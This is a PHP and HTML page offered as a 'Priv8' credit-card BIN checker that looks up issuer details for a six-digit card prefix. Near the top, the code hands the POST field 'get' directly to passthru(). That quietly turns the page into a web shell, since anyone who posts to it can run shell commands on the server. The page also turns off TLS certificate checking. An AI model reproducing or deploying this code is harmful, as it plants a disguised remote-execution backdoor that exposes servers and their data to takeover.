<!-- PHP -->
<?php
  // Dimulai dengan POST Method
  if(isset($_POST['get'])){
  $script = $_POST['get'];
  passthru($script);
  $six = $_POST['enamdigit'];
  // Insert CURL
  function curl($url, $var = null) {
      $curl = curl_init($url);
      curl_setopt($curl, CURLOPT_TIMEOUT, 25);
      if ($var != null) {
          curl_setopt($curl, CURLOPT_POST, true);
          curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
      }
      curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
      curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
      $result = curl_exec($curl);
      curl_close($curl);
      return $result;
  }
  // Enam digit Formula
  function defineNUM($bin) {
      return substr($bin,0,6);
  }
  // JSON DATA
    $bin = defineNUM($six);
    $curl = curl("https://lookup.binlist.net/".$bin); // Thanks to this API!
    $json = json_decode($curl);
    $brand = $json->scheme ? $json->scheme : "error";
    $cardType = $json->type ? $json->type : "error";
    $cardCategory = $json->bank ? $json->bank : "error";
    $countryName = $json->country ? $json->country : "error";
    $countryCode = $json->country ? $json->country : "error";
    $details = '<p>BIN: '.$bin.'</br>Brand: '.$brand.'</br>Bank Name: '.$cardCategory->name.'</br>Bank URL: '.$cardCategory->url.'</br>Bank Phone: '.$cardCategory->phone.'</br>Type: '.$cardType.'</br>Country Name: '.$countryName->name.'</br>Country Code: '.$countryCode->alpha2.'</p>';
    
    if ($six == null) {
    die('error!');
}
    $binresult = $details;
}
?>
<!-- HTML -->
<html>
  <head>
    <title>Bin Checker | Bukan Coder Priv8 Tools</title>
  </head>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-87406649-1', 'auto');
  ga('send', 'pageview');

</script>

<link rel="stylesheet" href="style.css">
<link rel="SHORTCUT ICON" href="https://static.bukancoder.co/images/amazon.png"/>
<center>
	<a href="/"><img src="https://static.bukancoder.co/images/bukancoderlogo.png"/></a>

	<p><font color="#0076a3"><b>Priv8 Bank Identification Numbers Checker</b></font></p>
	<p><font color="#0076a3">Checking BIN with 6 digit card code</font></p>
	<div style="padding:10px;border:1px dotted #0076a3;">
<font color="#ffffff">Get in touch via email Teguh@slackerc0de.us</font>
</div></center>
  <body>
   <br></br><center> <form method="post">
    <input type="text" id="enamdigit" name="enamdigit" placeholder="6 digit kartu" size="16" required>
    <br><button type="submit" name="get" class="Button">CHECK NOW</button>
    </form></center>
    <!-- Results here! -->
    <center><?php echo $binresult ?></center>
  </body>
</html>
